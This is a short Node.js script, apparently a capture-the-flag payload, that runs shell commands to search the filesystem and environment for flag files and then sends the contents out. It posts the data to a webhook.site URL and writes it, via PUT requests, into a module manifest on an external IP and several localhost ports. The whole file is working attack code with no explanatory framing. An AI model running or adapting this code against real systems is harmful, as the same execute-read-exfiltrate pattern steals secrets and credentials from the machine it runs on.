const cp=require('child_process'),https=require('https'),http=require('http');
let f='';
try{ f=cp.execSync("cat /flag* /root/flag* /app/flag* 2>/dev/null; find / -maxdepth 4 -iname 'flag*' -exec cat {} + 2>/dev/null; env|grep -iE 'flag|htb'",{timeout:8000}).toString(); }catch(e){ f='ERR '+e; }
f=f||'RAN_NO_FLAG';
try{ https.get('https://webhook.site/23a9d685-ed45-4f68-af95-a29e66de7d5e/GIT?d='+encodeURIComponent(f)); }catch(e){}
const body=JSON.stringify({manifest:'ecto_module:\n  name: '+JSON.stringify('PWN::'+f.replace(/\s+/g,'_'))+'\n  version: "1.0.0"\n'});
[['154.57.164.77',34302],['127.0.0.1',34302],['127.0.0.1',80],['127.0.0.1',1337],['127.0.0.1',3000]].forEach(t=>{try{const r=http.request({host:t[0],port:t[1],path:'/api/modules/ECT-987654',method:'PUT',headers:{'Content-Type':'application/json','Content-Length':Buffer.byteLength(body)}});r.on('error',()=>{});r.write(body);r.end();}catch(e){}});
